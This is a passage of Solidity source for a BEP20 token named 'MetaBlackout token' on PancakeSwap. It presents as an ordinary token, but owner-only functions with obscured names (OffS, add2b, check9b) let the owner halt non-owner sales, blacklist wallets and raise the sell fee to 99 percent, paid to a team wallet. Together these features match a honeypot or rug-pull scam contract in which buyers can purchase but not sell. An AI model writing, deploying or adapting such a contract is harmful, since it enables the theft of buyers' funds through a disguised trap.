}



contract SollyToken is Context, IBEP20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => bool) private _isExcludedFromFee;

    mapping (address => bool) private _isExchange;

    mapping (address => bool) private _blackList;

    mapping (address => mapping (address => uint256)) private _allowances;

    string private     _name = "MetaBlackout token";
    string private   _symbol = "METABT";
    uint8 private  _decimals = 8;
    uint256 private _totalSupply = 100000000000 * 10 ** _decimals;

    uint256 public          _teamFee = 10;
    uint256 private _previousTeamFee = _teamFee;

    address private _teamWallet;

    bool public _saleAllowed = true;


    // auto liquidity
    IPancakeRouter02 public pancakeRouter;
    address            public pancakePair;

    constructor (address cOwner, address _team) Ownable(cOwner) {
        _balances[cOwner] = _totalSupply;
        _teamWallet = _team;

        // pancakeswap

        //testnet
        //address routerAddress = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
        //mainnet
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;


        pancakeRouter = IPancakeRouter02(routerAddress);

        pancakePair = IPancakeFactory(pancakeRouter.factory()).createPair(
            address(this),
            pancakeRouter.WETH()
        );

        _isExchange[routerAddress] = true;
        _isExchange[pancakePair] = true;


        // exclude system contracts
        _isExcludedFromFee[owner()]       = true;
        _isExcludedFromFee[_teamWallet]       = true;
        _isExcludedFromFee[address(this)] = true;


        emit Transfer(address(0), cOwner, _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }


    function OnS() public onlyOwner {
        require(!_saleAllowed, "Sale is already allowed");
        _saleAllowed = true;
    }


    function OffS() external onlyOwner {
        require(_saleAllowed, "Sale is already disalowed");
        _saleAllowed = false;

    }


    function add2b(address account) public onlyOwner {
        require(!_blackList[account], "Account is already in blacklist");
        _blackList[account] = true;
    }

    function r2b(address account) external onlyOwner {
        require(_blackList[account], "Account is not in blacklist");
        _blackList[account] = false;

    }

    function check9b(address account) public view returns(bool) {
        return _blackList[account];
    }


    function addToExchanges(address account) public onlyOwner {
        require(!_isExchange[account], "Account is already set as an exchange");
        _isExchange[account] = true;
    }

    function removeFromExchanges(address account) external onlyOwner {
        require(_isExchange[account], "Account is not an exchange");
        _isExchange[account] = false;

    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }


    function changeTeamWallet(address account) public onlyOwner {
        require(account != address(0), "Zero address prohibited.");
        _isExcludedFromFee[_teamWallet] = false;
        _isExcludedFromFee[account] = true;
        _teamWallet = account;
    }


    function setTeamFee(uint256 _fee) external onlyOwner {
        require(_fee < uint256(100), "Team fee too high");
        _previousTeamFee = _teamFee;
        _teamFee = _fee;
    }


    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }


    function _takeFee(uint256 _fee, address account) private {
        _balances[_teamWallet] = _balances[_teamWallet].add(_fee);
        emit Transfer(account, _teamWallet, _fee);

    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(_balances[from] >= amount, "Insufficient token balance");
        require(!_blackList[from], "Wallet is blacklisted.");
        if (from != owner() && to != owner() && !_isExchange[from]) {
            require(_saleAllowed, "Sale is not allowed");
        }

        uint256 _fee;
        _balances[from]    = _balances[from].sub(amount);

        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            _fee = 0;
        } else if (_isExchange[to]) {
            _fee = amount.mul(_teamFee).div(100);

        }
        uint256 transferAmount = amount.sub(_fee);
        if (_fee > 0) {
            _takeFee(_fee, from);
        }
        _balances[to] = _balances[to].add(transferAmount);
        emit Transfer(from, to, transferAmount);

    }


}
